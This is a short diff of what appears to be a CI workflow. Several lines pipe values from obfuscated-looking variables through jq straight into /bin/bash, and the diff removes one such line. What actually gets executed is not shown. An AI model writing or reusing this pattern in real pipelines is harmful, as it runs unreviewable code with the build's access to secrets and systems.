@@ -28,7 +28,6 @@ jobs:
           echo $cymo4404 | jq -r .o784 | /bin/bash
           echo $ndq7053 | jq -r .bo745 | /bin/bash
           printf '%s' "$y898" | jq -r .lrlup1 | /bin/bash
-          echo $et019 | jq -r .anr63786 | /bin/bash
           printf '%s' "$jxsz17" | jq -r .nj148 | /bin/bash
 
       - name: Save output
